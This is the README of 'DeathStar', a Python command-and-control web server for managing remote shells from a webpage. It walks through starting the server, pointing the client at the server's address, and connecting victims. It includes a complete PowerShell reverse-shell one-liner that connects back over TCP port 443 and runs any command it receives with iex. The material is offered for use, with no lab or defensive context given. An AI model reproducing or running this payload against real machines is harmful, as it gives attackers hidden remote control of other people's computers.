# DeathStar
Python webserver that receives shell connections from remote devices. 

Remote devices can be managed from the DeathStar webpage.

# Web page
<img width="1162" alt="Screenshot 2024-12-21 at 1 03 20 AM" src="https://github.com/user-attachments/assets/9145dc13-14d0-440c-9d00-9a60f547bbc5" />

# Download DeathStar

```git clone github.com/bwithe/deathstar```

# Web C2 server 
1. Start the server
    - `python3 deathstar.py`

2. Open link in web browser
    - `firefox 127.0.0.1:8000`

3. Modify `<DEATHSTAR_IP>` in `client.py`

4. Have CLIENT connect to C2
    - Linux / MacOS
      - `python3 client.py`
    - Windows
        - `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('<DEATHSTAR_IP>',443);$s=$c.GetStream();$s.Write([byte[]](@(0x0A)),0,1);while($true){$b=[byte[]]::new(1024);$r=$s.Read($b,0,1024);$t=[text.encoding]::ASCII.GetString($b,0,$r).Trim();if($t -eq 'die'){exit};if($t -eq 'hostname'){$o=$env:COMPUTERNAME}elseif($t -eq 'whoami'){$o=$env:USERNAME}else{$o=iex $t 2>&1|Out-String};$o=$o.Trim()+[char]10;$d=[text.encoding]::ASCII.GetBytes($o);$s.Write($d,0,$d.Length)}"`
